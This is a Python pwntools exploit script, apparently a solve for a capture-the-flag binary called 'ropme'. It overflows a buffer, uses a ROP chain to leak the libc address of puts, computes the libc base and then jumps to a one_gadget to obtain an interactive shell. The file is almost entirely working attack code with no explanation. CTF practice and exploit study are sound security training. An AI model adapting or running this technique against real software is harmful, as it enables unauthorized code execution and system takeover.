#!/usr/bin/env python3


from pwn import *
from pwnc.pwnc import get_libc

BINARY = "./ropme"
LIBC = "./libc.so.6"
LD = "./ld-2.23.so"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


class Gadgets:
    pop_rdi_ret = 0x4006D3
    one_gadget = 0x4526A


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(
            [ld.path, elf.path],
            stdin=pty,
            stdout=pty,
            stderr=pty,
            env={"LD_PRELOAD": libc.path},
        )

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    payload = [
        cyclic(cyclic_find(0x616161616161616A, n=8), n=8),
        Gadgets.pop_rdi_ret,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.main,
    ]
    io.sendlineafter("ROP me outside, how 'about dah?\n", flat(payload))

    puts_leak = u64(io.recvuntil("\n")[:-1].ljust(8, b"\x00"))
    log.success(f"puts @: {hex(puts_leak)}")
    libc.address = puts_leak - libc.sym.puts
    log.success(f"libc base addr @: {hex(libc.address)}")

    payload = [
        cyclic(cyclic_find(0x616161616161616A, n=8), n=8),
        libc.address + Gadgets.one_gadget,
    ]
    payload.append(b"\x00" * (0x1F4 - len(flat(payload))))
    io.sendlineafter("ROP me outside, how 'about dah?\n", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
